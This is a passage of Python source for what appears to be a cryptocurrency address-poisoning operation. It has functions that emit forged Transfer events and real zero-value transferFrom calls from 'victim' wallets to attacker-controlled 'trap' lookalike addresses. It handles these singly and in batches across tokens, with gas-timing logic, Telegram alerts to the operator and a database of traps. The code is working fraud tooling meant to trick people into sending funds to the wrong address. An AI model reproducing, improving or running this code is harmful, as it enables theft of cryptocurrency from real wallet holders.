    if now - last_alert > 3600: # Rate limit: Once per hour
        # Map chain to CoinGecko ID
        coin_id = "ethereum"
        if CHAIN.lower() == "bsc": coin_id = "binancecoin"
        elif CHAIN.lower() == "polygon": coin_id = "matic-network"
        
        try:
            price_data = json.loads(urllib.request.urlopen(
                urllib.request.Request(
                    f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd",
                    headers={'User-Agent': 'CipherNet/1.0'}
                ), timeout=3
            ).read().decode())
            native_price = price_data[coin_id]['usd']
            needed_usd = float(needed_eth) * native_price
            have_usd = float(have_eth) * native_price
            fund_usd = max(10.0, float(shortfall) * native_price * 100)
            fund_native = fund_usd / native_price
            price_line = f" (~${needed_usd:.2f} needed, ~${have_usd:.4f} balance)"
            fund_suggestion = f"{fund_native:.4f} {NATIVE_SYMBOL} (~${fund_usd:.2f})"
        except Exception:
            price_line = ""
            fund_suggestion = f"0.01 {NATIVE_SYMBOL}"
        
        alert_msg = (
            f"⛽ Insufficient Gas in Funding Wallet ({context})\n\n"
            f"Your campaign funding wallet cannot emit batch events.\n\n"
            f"🔑 Wallet: `{operator_addr}`\n"
            f"📊 Needed: `{needed_eth:.8f} {NATIVE_SYMBOL}`{price_line}\n"
            f"💰 Balance: `{have_eth:.8f} {NATIVE_SYMBOL}`\n"
            f"📉 Shortfall: `{shortfall:.8f} {NATIVE_SYMBOL}`\n\n"
            f"💡 Fund this wallet with at least **{fund_suggestion}** to continue operations."
        )
        send_telegram(alert_msg, campaign_id=campaign_id)
        _last_gas_insufficient_alert[operator_addr] = now
    

def get_explorer_url(address, link_type='address'):
    """Generate Etherscan/BscScan/PolygonScan URL."""
    base_urls = {
        'ethereum': 'https://etherscan.io',
        'bsc': 'https://bscscan.com',
        'polygon': 'https://polygonscan.com'
    }
    base_url = base_urls.get(CHAIN.lower(), 'https://etherscan.io')
    
    if link_type == 'tx':
        return f"{base_url}/tx/{address}"
    return f"{base_url}/address/{address}#tokentxns"


def notify_gas_strategy(campaign_id, used_fallback, final_gwei):
    """Send a Telegram notification about which gas strategy was used."""
    try:
        if used_fallback:
            msg = (
                f"⚠️ *Gas Strategy: Fallback Used*\n\n"
                f"The network stayed congested for 90 minutes.\n\n"
                f"⛽ *Firing at Market Rate:* `{final_gwei:.2f} Gwei`\n\n"
                f"💡 _This ensures your nonces don't get stuck, but costs slightly more._"
            )
            send_telegram(msg, campaign_id=campaign_id)
        else:
            msg = (
                f"✅ *Gas Strategy: Cheap Gas Sniped!*\n\n"
                f"The network is currently uncongested.\n\n"
                f"⛽ *Firing at Cheap Rate:* `{final_gwei:.2f} Gwei`\n\n"
                f"💰 _Saving you money on this batch!_"
            )
            send_telegram(msg, campaign_id=campaign_id)
    except Exception as e:
        logger.warning(f"[gas-strategy] Failed to send gas notification: {e}")

def check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, context):
    """Checks if operator has enough balance for gas. Returns True if OK, False if insufficient."""
    operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
    gas_price = gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
    gas_cost = estimated_gas * gas_price
    
    if operator_balance < gas_cost:
        needed_eth = float(w3.from_wei(gas_cost, 'ether'))
        have_eth = float(w3.from_wei(operator_balance, 'ether'))
        shortfall = needed_eth - have_eth
        logger.error(f"[{context}] Insufficient gas. Need {needed_eth}, have {have_eth}")
        send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context=context)
        return False
    return True    


def get_smart_gas_params(w3, context="[gas-strategy]", campaign_id=None):
    """
    Smart Gas Strategy: Wait for cheap gas (0.5 Gwei), but fallback to spot price 
    if it takes longer than 10 minutes to prevent stuck nonces.
    """
    default_max_fee = w3.to_wei(2, 'gwei')
    default_priority = w3.to_wei(0.01, 'gwei')
    
    target_max_fee = w3.to_wei(0.5, 'gwei')
    network_tip = w3.to_wei(0.01, 'gwei')
    
    used_fallback = False
    final_gwei = 0.0
    
    try:
        latest_block = call_with_retry(w3.eth.get_block, "latest")
        base_fee = latest_block.get("baseFeePerGas", 0) or 0
        base_fee_gwei = float(w3.from_wei(base_fee, 'gwei'))
        target_gwei = float(w3.from_wei(target_max_fee, 'gwei'))
        final_gwei = base_fee_gwei
        
        if base_fee <= target_max_fee:
            final_max_fee = base_fee + network_tip
            logger.info(f"{context} ✅ Base fee is cheap ({base_fee_gwei:.2f} Gwei). Firing immediately!")
        else:
            logger.info(f"{context} ⏳ Base fee is {base_fee_gwei:.2f} Gwei. Waiting up to 90 mins for it to drop to <{target_gwei} Gwei...")
            
            gas_dropped = False
            for i in range(90): # 90 iterations * 60s = 90 mins (1.5 hours)
                time.sleep(60)
                
                try:
                    current_block = call_with_retry(w3.eth.get_block, "latest")
                    current_base_fee = current_block.get("baseFeePerGas", 0) or 0
                    current_gwei = float(w3.from_wei(current_base_fee, 'gwei'))
                    final_gwei = current_gwei
                    
                    if current_base_fee <= target_max_fee:
                        final_max_fee = current_base_fee + network_tip
                        gas_dropped = True
                        logger.info(f"{context} ✅ Base fee dropped to {current_gwei:.2f} Gwei! Firing at cheap rate!")
                        break
                    
                    if i % 10 == 0:
                        logger.info(f"{context} ⏳ Still waiting... Current base fee: {current_gwei:.2f} Gwei")
                except Exception as e:
                    logger.warning(f"{context} Failed to check base fee: {e}")
                    break
                    
            if not gas_dropped:
                used_fallback = True
                try:
                    fallback_block = call_with_retry(w3.eth.get_block, "latest")
                    fallback_base_fee = fallback_block.get("baseFeePerGas", base_fee) or base_fee
                    final_max_fee = fallback_base_fee + network_tip
                    fallback_gwei = float(w3.from_wei(fallback_base_fee, 'gwei'))
                    final_gwei = fallback_gwei
                    logger.warning(f"{context} ⚠️ Gas stayed high for 90 mins. Firing at current market rate ({fallback_gwei:.2f} Gwei) to prevent stuck nonces.")
                except Exception as e:
                    final_max_fee = base_fee + network_tip
                    logger.warning(f"{context} ⚠️ Gas check failed. Firing at original base fee.")
                    
        # 🚀 Send Telegram Notification
        if campaign_id:
            notify_gas_strategy(campaign_id, used_fallback, final_gwei)
            
        return {'maxFeePerGas': final_max_fee, 'maxPriorityFeePerGas': network_tip}
        
    except Exception as e:
        logger.warning(f"{context} Failed to estimate fees, using defaults: {e}")
        return {'maxFeePerGas': default_max_fee, 'maxPriorityFeePerGas': default_priority}


def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaign_id):
    """
    Emit a forged Transfer event via MirrorToken contract.
    Returns tx_hash on success, None on failure.
    """
        # Try exact match, then uppercase, then fallback to native ETH contract
    contract_address = (
        MIRROR_CONTRACTS.get(asset) or 
        MIRROR_CONTRACTS.get(asset.upper()) or 
        MIRROR_TOKEN_NATIVE  # 🆕 Fallback to native ETH stealth contract
    )
    if not contract_address:
        logger.warning(f"[mirror] No MirrorToken contract configured for {asset} (no fallback available)")
        return None
    
    # Log fallback usage for unknown tokens
    is_fallback = (
        contract_address == MIRROR_TOKEN_NATIVE and 
        asset.upper() not in ('ETH', 'BNB', 'MATIC')
    )
    if is_fallback:
        logger.info(f"[mirror] Using ETH fallback contract for unknown token: {asset}")

    operator_key = get_mirror_operator_key(campaign_id)
    if not operator_key:
        logger.warning(f"[mirror] No funding key for campaign {campaign_id}, cannot emit mirror")
        return None

    try:
        operator_account = w3.eth.account.from_key(operator_key)
        operator_addr = operator_account.address

        contract = w3.eth.contract(
            address=w3.to_checksum_address(contract_address),
            abi=MIRROR_ABI
        )

        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")

        # Use low gas - mirror only needs ~50k gas
        latest_block = call_with_retry(w3.eth.get_block, "latest")
        use_eip1559 = (
            "baseFeePerGas" in latest_block
            and latest_block["baseFeePerGas"] is not None
            and CHAIN.lower() != "bsc"
        )

        gas_params = {}
        if use_eip1559:
            gas_params = get_smart_gas_params(w3, context="[mirror]", campaign_id=campaign_id)
        else:
            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)

        estimated_gas = 80000 # 🚀 Increased buffer to match re_poison.js

        tx = contract.functions.transferFrom(
            w3.to_checksum_address(victim_address),
            w3.to_checksum_address(trap_address),
            raw_value
        ).build_transaction({
            'from': operator_addr,
            'nonce': nonce,
            'gas': estimated_gas,
            'chainId': w3.eth.chain_id,
            **gas_params
        })

        # 🚀 DRY Refactor: Use shared balance checker
        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "mirror"):
            return None
        signed = w3.eth.account.sign_transaction(tx, operator_key)
        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
        tx_hash = w3.eth.send_raw_transaction(raw_tx)
        logger.info(f"[mirror] Forged Transfer emitted: {victim_address} → {trap_address} raw={raw_value} {asset} tx={tx_hash.hex()}")

        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
        if receipt.status == 1:
            logger.info(f"[mirror] ✅ Mirror tx confirmed in block {receipt.blockNumber}")
            return tx_hash.hex()
        else:
            logger.error(f"[mirror] ❌ Mirror tx reverted")
            return None

    except Exception as e:
        logger.error(f"[mirror] Failed to emit forged transfer: {e}")
        return None



def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
    """
    Emit multiple forged Transfer events in a SINGLE transaction.
    """
    if len(victims) != len(traps) or len(victims) != len(amounts):
        logger.error("[batch-mirror] Mismatched array lengths")
        return None
    
    # 🚀 FIX: Route to the correct stealth contract based on the batch's asset
    contract_address = (
        MIRROR_CONTRACTS.get(asset) or 
        MIRROR_CONTRACTS.get(asset.upper()) or 
        MIRROR_TOKEN_NATIVE
    )
    if not contract_address:
        logger.warning(f"[batch-mirror] No contract configured for {asset}")
        return None
    
    operator_key = get_mirror_operator_key(campaign_id)
    if not operator_key:
        logger.warning(f"[batch-mirror] No funding key for campaign {campaign_id}")
        return None
    
    try:
        operator_account = w3.eth.account.from_key(operator_key)
        operator_addr = operator_account.address
        
        contract = w3.eth.contract(
            address=w3.to_checksum_address(contract_address),
            abi=MIRROR_ABI
        )
        
        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
        
        latest_block = call_with_retry(w3.eth.get_block, "latest")
        use_eip1559 = (
            "baseFeePerGas" in latest_block
            and latest_block["baseFeePerGas"] is not None
            and CHAIN.lower() != "bsc"
        )
        
        gas_params = {}
        if use_eip1559:
            gas_params = get_smart_gas_params(w3, context="[batch-mirror]", campaign_id=campaign_id)
        else:
            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
        
        estimated_gas = 50000 + (15000 * len(victims))
        
        victims_checksum = [w3.to_checksum_address(v) for v in victims]
        traps_checksum = [w3.to_checksum_address(t) for t in traps]
        
        tx = contract.functions.execute(
            victims_checksum,
            traps_checksum,
            amounts
        ).build_transaction({
            'from': operator_addr,
            'nonce': nonce,
            'gas': estimated_gas,
            'chainId': w3.eth.chain_id,
            **gas_params
        })
        
        # 🚀 DRY Refactor: Use shared balance checker
        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "batch-mirror"):
            return None
        
        signed = w3.eth.account.sign_transaction(tx, operator_key)
        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
        tx_hash = w3.eth.send_raw_transaction(raw_tx)
        
        logger.info(f"[batch-mirror] Batch emission sent: {len(victims)} transfers in tx={tx_hash.hex()}")
        
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
        if receipt.status == 1:
            logger.info(f"[batch-mirror] ✅ Batch confirmed in block {receipt.blockNumber}")
            return tx_hash.hex()
        else:
            logger.error(f"[batch-mirror] ❌ Batch tx reverted")
            return None
    
    except Exception as e:
        logger.error(f"[batch-mirror] Failed to emit batch: {e}")
        return None


def emit_multi_token_batch_transfers(queue, campaign_id):
    """
    Emit multiple forged Transfer events for DIFFERENT tokens in a SINGLE transaction
    using the MultiTokenBatchRouter contract.
    """
    if not MULTI_TOKEN_ROUTER:
        logger.error("[multi-batch] MULTI_TOKEN_ROUTER not configured in .env")
        return None
        
    operator_key = get_mirror_operator_key(campaign_id)
    if not operator_key:
        logger.warning(f"[multi-batch] No funding key for campaign {campaign_id}")
        return None
        
    try:
        operator_account = w3.eth.account.from_key(operator_key)
        operator_addr = operator_account.address
        
        router_contract = w3.eth.contract(
            address=w3.to_checksum_address(MULTI_TOKEN_ROUTER),
            abi=MULTI_TOKEN_ROUTER_ABI
        )
        
        # Group queue items by asset (contract address)
        asset_groups = {}
        for q in queue:
            asset = q['asset']
            contract_address = (
                MIRROR_CONTRACTS.get(asset) or 
                MIRROR_CONTRACTS.get(asset.upper()) or 
                MIRROR_TOKEN_NATIVE
            )
            if not contract_address:
                logger.warning(f"[multi-batch] No contract for asset {asset}, skipping")
                continue
                
            if contract_address not in asset_groups:
                asset_groups[contract_address] = []
            asset_groups[contract_address].append(q)
            
        if not asset_groups:
            logger.error("[multi-batch] No valid assets to batch")
            return None
            
        # Build the BatchCall structs (using tuples for max web3.py compatibility)
        calls = []
        total_transfers = 0
        for contract_addr, items in asset_groups.items():
            froms = [w3.to_checksum_address(q['victim']) for q in items]
            tos = [w3.to_checksum_address(q['trap']) for q in items]
            values = [q['amount'] for q in items]
            total_transfers += len(items)
            
            calls.append((
                w3.to_checksum_address(contract_addr),
                froms,
                tos,
                values
            ))
            
        logger.info(f"[multi-batch] Fetching nonce for {operator_addr}...")
        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
        logger.info(f"[multi-batch] Got nonce: {nonce}")
        
        latest_block = call_with_retry(w3.eth.get_block, "latest")
        use_eip1559 = (
            "baseFeePerGas" in latest_block
            and latest_block["baseFeePerGas"] is not None
            and CHAIN.lower() != "bsc"
        )
        
        gas_params = {}
        if use_eip1559:
            gas_params = get_smart_gas_params(w3, context="[multi-batch]", campaign_id=campaign_id)
        else:
            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
            
        estimated_gas = 50000 + (15000 * total_transfers)
        
        tx = router_contract.functions.transfer(calls).build_transaction({
            'from': operator_addr,
            'nonce': nonce,
            'gas': estimated_gas,
            'chainId': w3.eth.chain_id,
            **gas_params
        })
        
        # 🚀 DRY Refactor: Use shared balance checker
        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "multi-batch"):
            return None
            
        logger.info(f"[multi-batch] Signing transaction...")
        signed = w3.eth.account.sign_transaction(tx, operator_key)
        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
        
        logger.info(f"[multi-batch] Broadcasting to RPC...")
        tx_hash = w3.eth.send_raw_transaction(raw_tx)
        
        logger.info(f"[multi-batch] Multi-token batch sent: {total_transfers} transfers across {len(calls)} tokens in tx={tx_hash.hex()}")
        
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
        if receipt.status == 1:
            logger.info(f"[multi-batch] ✅ Multi-token batch confirmed in block {receipt.blockNumber}")
            return tx_hash.hex()
        else:
            logger.error(f"[multi-batch] ❌ Multi-token batch reverted")
            return None
            
    except Exception as e:
        logger.error(f"[multi-batch] Failed to emit multi-token batch: {e}")
        return None    


REAL_ZERO_BATCH_ROUTER_ABI = json.loads('''[
  {
    "inputs": [
      {
        "components": [
          {"internalType": "address", "name": "token", "type": "address"},
          {"internalType": "address", "name": "from", "type": "address"},
          {"internalType": "address", "name": "to", "type": "address"},
          {"internalType": "uint256", "name": "value", "type": "uint256"}
        ],
        "internalType": "struct RealZeroBatchRouter.Call[]",
        "name": "calls",
        "type": "tuple[]"
      }
    ],
    "name": "transfer",
    "outputs": [
      {"internalType": "uint256", "name": "successCount", "type": "uint256"},
      {"internalType": "uint256", "name": "failCount", "type": "uint256"}
    ],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true,  "internalType": "uint256", "name": "index",   "type": "uint256"},
      {"indexed": true,  "internalType": "address", "name": "token",   "type": "address"},
      {"indexed": false, "internalType": "bool",    "name": "success", "type": "bool"},
      {"indexed": false, "internalType": "address", "name": "from",    "type": "address"},
      {"indexed": false, "internalType": "address", "name": "to",      "type": "address"}
    ],
    "name": "BatchTransferResult",
    "type": "event"
  }
]''')

REAL_ZERO_BATCH_ASSUME_SUCCESS_IF_NO_LOGS = (
    os.getenv("REAL_ZERO_BATCH_ASSUME_SUCCESS_IF_NO_LOGS", "false")
    .strip()
    .lower()
    in ("1", "true", "yes", "on")
)


def _keccak_text_hex(text):
    h = Web3.keccak(text=text).hex()
    if not h.startswith("0x"):
        h = "0x" + h
    return h.lower()


def _log_topic_hex(topic):
    if topic is None:
        return None
    if isinstance(topic, str):
        h = topic
    else:
        try:
            h = topic.hex()
        except Exception:
            h = str(topic)
    if not h.startswith("0x"):
        h = "0x" + h
    return h.lower()


def _bytes_from_hexish(value):
    if value is None:
        return b""
    if isinstance(value, (bytes, bytearray)):
        return bytes(value)
    try:
        h = value.hex()
    except Exception:
        h = str(value)
    if h.startswith("0x") or h.startswith("0X"):
        h = h[2:]
    try:
        return bytes.fromhex(h)
    except Exception:
        return b""


def _hex_topic_to_address(topic):
    h = _log_topic_hex(topic)
    if not h or len(h) < 42:
        return None
    try:
        return Web3.to_checksum_address("0x" + h[-40:]).lower()
    except Exception:
        return None


TRANSFER_EVENT_TOPIC0 = _keccak_text_hex("Transfer(address,address,uint256)")

REAL_ZERO_BATCH_RESULT_EVENT_SIGNATURES = [
    "BatchTransferResult(uint256,address,bool,address,address)",
    "BatchTransferResult(uint256,address,bool)",
    "BatchTransferResult(uint256,address,bool,address)",
]

REAL_ZERO_BATCH_RESULT_TOPIC0S = {
    _keccak_text_hex(sig): sig
    for sig in REAL_ZERO_BATCH_RESULT_EVENT_SIGNATURES
}


def update_trap_zero_dust_count(trap_id):
    """
    Optional Supabase zero_dust_count tracker.
    Only runs when REAL_DUST_UPDATE_ZERO_COUNT=true and your table has:
    - zero_dust_count
    - last_zero_dusted_at
    """
    if not supabase or not trap_id:
        return

    now_iso = datetime.now(timezone.utc).isoformat()

    for attempt in range(3):
        try:
            result = supabase.table("traps").select("zero_dust_count").eq("id", trap_id).execute()
            current_count = 0
            if result.data and len(result.data) > 0:
                current_count = result.data[0].get("zero_dust_count", 0) or 0

            supabase.table("traps").update({
                "zero_dust_count": current_count + 1,
                "last_zero_dusted_at": now_iso
            }).eq("id", trap_id).execute()

            return

        except Exception as e:
            logger.warning(f"Failed to update zero_dust_count for trap {trap_id} (attempt {attempt + 1}/3): {e}")
            if attempt < 2:
                time.sleep(3)

    logger.error(f"All 3 attempts failed for zero_dust_count update on trap {trap_id}")


def send_real_zero_batch_telegram_notifications(
    queue,
    tx_hash,
    campaign_id,
    is_final=False,
    chunk_label=None,
):
    """
    Detailed Telegram notifications for real zero-value dust, styled like fake emit batches.
    """
    if not queue or not tx_hash:
        return

    try:
        tx_url = get_explorer_url(tx_hash, "tx")
        CHUNK_SIZE = 10
        chunks = [queue[i:i + CHUNK_SIZE] for i in range(0, len(queue), CHUNK_SIZE)]

        base_title = (
            "💧 *Final Real Zero-Dust Batch!*"
            if is_final
            else "💧 *Real Zero-Dust Batch Emitted!*"
        )

        if chunk_label:
            base_title = f"{base_title} — {chunk_label}"

        for chunk_idx, chunk in enumerate(chunks):
            if len(chunks) > 1:
                header = f"{base_title} (Part {chunk_idx + 1}/{len(chunks)})\n\n"
            else:
                header = f"{base_title}\n\n"

            if REAL_ZERO_BATCH_ROUTER:
                header += f"🛰️ Router: `{REAL_ZERO_BATCH_ROUTER}`\n"
            else:
                header += "🛰️ Mode: individual fallback\n"

            header += f"👥 Transfers in this TX: {len(queue)}\n"
            header += f"🔗 [View TX on Explorer]({tx_url})\n\n"

            msg = header

            start_idx = chunk_idx * CHUNK_SIZE + 1

            for idx, q in enumerate(chunk, start_idx):
                asset_str = str(q.get("asset") or REAL_DUST_DEFAULT_ASSET)
                decimals = get_token_decimals(asset_str)
                amount_raw = int(q.get("amount") or 0)
                amount_display = amount_raw / (10 ** decimals)

                victim_url = get_explorer_url(q["victim"])
                trap_url = get_explorer_url(q["trap"])

                msg += f"*{idx}.* ({amount_display:.6f} {asset_str})\n"
                msg += f"👤 [Victim]({victim_url})\n"
                msg += f"🪤 [Trap]({trap_url})\n\n"

            send_telegram(msg, campaign_id=campaign_id)

    except Exception as e:
        logger.error(f"[Telegram] Failed to send real zero batch notification: {e}")


def emit_real_zero_transfer(
    victim_address,
    trap_address,
    asset,
    campaign_id,
    nonce=None,
    gas_params_override=None,
):
    """
    Send a real 0-value ERC-20 transferFrom from victim -> trap.
    Value is 0, so allowance check passes without victim approval:
    allowed[victim][operator] >= 0 is always true.

    Returns:
    (tx_hash, next_nonce, success_bool)
    """
    token_address = get_real_token_address(asset)
    if not token_address:
        logger.warning(f"[real-zero] No real token contract configured for {asset}")
        return None, nonce, False

    operator_key = get_mirror_operator_key(campaign_id)
    if not operator_key:
        logger.warning("[real-zero] No funding key configured for real zero dust")
        return None, nonce, False

    try:
        operator_account = w3.eth.account.from_key(operator_key)
        operator_addr = operator_account.address

        real_transfer_from_abi = ERC20_ABI + [
            {
                "constant": False,
                "inputs": [
                    {"name": "from", "type": "address"},
                    {"name": "to", "type": "address"},
                    {"name": "value", "type": "uint256"},
                ],
                "name": "transferFrom",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function",
            }
        ]

        token_contract = w3.eth.contract(
            address=w3.to_checksum_address(token_address),
            abi=real_transfer_from_abi,
        )

        if nonce is None:
            nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")

        latest_block = call_with_retry(w3.eth.get_block, "latest")
        use_eip1559 = (
            "baseFeePerGas" in latest_block
            and latest_block["baseFeePerGas"] is not None
            and CHAIN.lower() != "bsc"
        )

        if gas_params_override is not None:
            gas_params = dict(gas_params_override)

            # If locked params are EIP-1559 but this chain/path uses legacy gasPrice.
            if not use_eip1559 and "maxFeePerGas" in gas_params:
                gas_params = {"gasPrice": gas_params["maxFeePerGas"]}

            # If locked params are legacy but this path uses EIP-1559.
            if (
                use_eip1559
                and "gasPrice" in gas_params
                and "maxPriorityFeePerGas" not in gas_params
            ):
                base_fee = latest_block.get("baseFeePerGas") or 0
                gas_price = int(gas_params["gasPrice"])
                default_tip_wei = w3.to_wei(REAL_DUST_MIN_TIP_GWEI, "gwei")
                remaining_wei = max(0, gas_price - int(base_fee))
                tip_wei = min(default_tip_wei, remaining_wei)
                if tip_wei == 0 and gas_price > int(base_fee):
                    tip_wei = 1
                gas_params = {
                    "maxFeePerGas": gas_price,
                    "maxPriorityFeePerGas": tip_wei,
                }
        else:
            gas_params = get_smart_gas_params(
                w3,
                context="[real-zero][tx]",
                campaign_id=campaign_id,
            )

        tx = token_contract.functions.transferFrom(
            w3.to_checksum_address(victim_address),
            w3.to_checksum_address(trap_address),
            0,
        ).build_transaction({
            "from": operator_addr,
            "nonce": nonce,
            "chainId": w3.eth.chain_id,
            "gas": REAL_DUST_GAS_LIMIT,
            **gas_params,
        })

        if not check_operator_balance_and_alert(
            w3,
            operator_addr,
            tx["gas"],
            gas_params,
            campaign_id,
            "real-zero",
        ):
            logger.warning(
                f"[real-zero] Insufficient operator gas for real-zero "
                f"{asset} transferFrom {victim_address} -> {trap_address}"
            )
            return None, nonce, False

        logger.info(
            f"[real-zero] Broadcasting real-zero "
            f"{asset} transferFrom {victim_address} -> {trap_address} | "
            f"gas={tx['gas']} | nonce={nonce}"
        )

        signed = w3.eth.account.sign_transaction(tx, operator_key)
        raw_tx = getattr(signed, "raw_transaction", getattr(signed, "rawTransaction", None))
        tx_hash = w3.eth.send_raw_transaction(raw_tx)

        logger.info(
            f"[real-zero] 0-value {asset} transferFrom sent: "
            f"{victim_address} -> {trap_address} tx={tx_hash.hex()}"
        )

        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)

        if receipt.status == 1:
            logger.info(
                f"[real-zero] ✅ Confirmed in block {receipt.blockNumber} "
                f"tx={tx_hash.hex()}"
            )
            return tx_hash.hex(), nonce + 1, True

        logger.error(f"[real-zero] ❌ Tx reverted tx={tx_hash.hex()}")
        return tx_hash.hex(), nonce + 1, False

    except Exception as e:
        err = str(e).lower()
        if (
            "nonce too low" in err
            or "replacement transaction" in err
            or "nonce has already been used" in err
        ):
            logger.warning(f"[real-zero] nonce desync: {e}")
            try:
                operator_addr = w3.eth.account.from_key(operator_key).address
                fresh_nonce = call_with_retry(
                    w3.eth.get_transaction_count,
                    operator_addr,
                    "pending",
                )
                return None, fresh_nonce, False
            except Exception:
                pass

        logger.error(f"[real-zero] transfer failed: {e}")
        return None, nonce, False


def emit_real_zero_batch_transfers(chunk, campaign_id, gas_params_override=None):
    """
    Emit a chunk of real 0-value ERC-20 transferFrom calls through
    RealZeroBatchRouter.batchTransferFrom(...).

    Returns:
    (tx_hash, success_trap_ids)
    """
    if not REAL_ZERO_BATCH_ROUTER:
        logger.error("[real-zero-batch] REAL_ZERO_BATCH_ROUTER not configured")
        return None, []

    operator_key = get_mirror_operator_key(campaign_id)
    if not operator_key:
        logger.error("[real-zero-batch] No funding key configured for real zero batch router")
        return None, []

    try:
        operator_account = w3.eth.account.from_key(operator_key)
        operator_addr = operator_account.address
        router_addr_checksum = w3.to_checksum_address(REAL_ZERO_BATCH_ROUTER)
        router_contract = w3.eth.contract(
            address=router_addr_checksum,
            abi=REAL_ZERO_BATCH_ROUTER_ABI,
        )
    except Exception as e:
        logger.error(f"[real-zero-batch] Invalid REAL_ZERO_BATCH_ROUTER config: {e}")
        return None, []

    calls = []
    valid_items = []

    for q in chunk:
        token_address = get_real_token_address(q.get("asset"))
        if not token_address:
            logger.warning(
                f"[real-zero-batch] No real token contract for asset={q.get('asset')} "
                f"victim={q.get('victim')}, skipping chunk item"
            )
            continue

        try:
            calls.append((
                w3.to_checksum_address(token_address),
                w3.to_checksum_address(q["victim"]),
                w3.to_checksum_address(q["trap"]),
                0,
            ))
            valid_items.append(q)
        except Exception as e:
            logger.warning(f"[real-zero-batch] Invalid address in chunk item, skipping: {e}")

    if not calls:
        return None, []

    estimated_gas = REAL_ZERO_BATCH_BASE_GAS + (REAL_ZERO_BATCH_PER_TRANSFER_GAS * len(calls))

    try:
        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
        latest_block = call_with_retry(w3.eth.get_block, "latest")

        use_eip1559 = (
            "baseFeePerGas" in latest_block
            and latest_block["baseFeePerGas"] is not None
            and CHAIN.lower() != "bsc"
        )

        if gas_params_override is not None:
            gas_params = dict(gas_params_override)

            if not use_eip1559 and "maxFeePerGas" in gas_params:
                gas_params = {"gasPrice": gas_params["maxFeePerGas"]}

            if (
                use_eip1559
                and "gasPrice" in gas_params
                and "maxPriorityFeePerGas" not in gas_params
            ):
                base_fee = latest_block.get("baseFeePerGas") or 0
                gas_price = int(gas_params["gasPrice"])
                default_tip_wei = w3.to_wei(REAL_DUST_MIN_TIP_GWEI, "gwei")
                remaining_wei = max(0, gas_price - int(base_fee))
                tip_wei = min(default_tip_wei, remaining_wei)
                if tip_wei == 0 and gas_price > int(base_fee):
                    tip_wei = 1
                gas_params = {
                    "maxFeePerGas": gas_price,
                    "maxPriorityFeePerGas": tip_wei,
                }
        else:
            gas_params = get_smart_gas_params(
                w3,
                context="[real-zero-batch]",
                campaign_id=campaign_id,
            )

        tx = router_contract.functions.transfer(calls).build_transaction({
            "from": operator_addr,
            "nonce": nonce,
            "chainId": w3.eth.chain_id,
            "gas": estimated_gas,
            **gas_params,
        })

        if not check_operator_balance_and_alert(
            w3,
            operator_addr,
            estimated_gas,
            gas_params,
            campaign_id,
            "real-zero-batch",
        ):
            return None, []

        logger.info(
            f"[real-zero-batch] Broadcasting chunk {len(calls)} transfers | "
            f"gas={estimated_gas:,} | router={router_addr_checksum}"
        )

        signed = w3.eth.account.sign_transaction(tx, operator_key)
        raw_tx = getattr(signed, "raw_transaction", getattr(signed, "rawTransaction", None))
        tx_hash = w3.eth.send_raw_transaction(raw_tx)

        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)

        if receipt.status != 1:
            logger.error(f"[real-zero-batch] ❌ Tx status 0: {tx_hash.hex()}")
            return tx_hash.hex(), []

        success_indices = []

        # 1) Manually decode known BatchTransferResult event topics.
        if valid_items:
            try:
                for log in receipt.logs:
                    log_addr = str(log.address or "").lower()
                    if log_addr != router_addr_checksum.lower():
                        continue
                    if not log.topics or len(log.topics) < 2:
                        continue

                    topic0 = _log_topic_hex(log.topics[0])
                    if topic0 not in REAL_ZERO_BATCH_RESULT_TOPIC0S:
                        continue

                    try:
                        idx_bytes = _bytes_from_hexish(log.topics[1])
                        idx = int.from_bytes(idx_bytes, "big")
                    except Exception:
                        continue

                    success = False
                    try:
                        data_bytes = _bytes_from_hexish(log.data)
                        if len(data_bytes) >= 32:
                            success = bool(int.from_bytes(data_bytes[:32], "big"))
                    except Exception:
                        success = False

                    if success and 0 <= idx < len(valid_items):
                        success_indices.append(idx)
            except Exception as e:
                logger.warning(f"[real-zero-batch] Manual BatchTransferResult decode failed: {e}")

        # 2) Infer success from standard ERC-20 Transfer logs:
        #    Transfer(victim, trap, 0)
        if not success_indices and valid_items:
            pending_by_key = {}
            for idx, q in enumerate(valid_items):
                token_address = get_real_token_address(q.get("asset"))
                if not token_address:
                    continue
                key = (
                    str(token_address).lower(),
                    str(q.get("victim", "")).lower(),
                    str(q.get("trap", "")).lower(),
                )
                pending_by_key.setdefault(key, []).append(idx)

            try:
                for log in receipt.logs:
                    if not log.topics or len(log.topics) < 3:
                        continue

                    topic0 = _log_topic_hex(log.topics[0])
                    if topic0 != TRANSFER_EVENT_TOPIC0:
                        continue

                    token = str(log.address or "").lower()
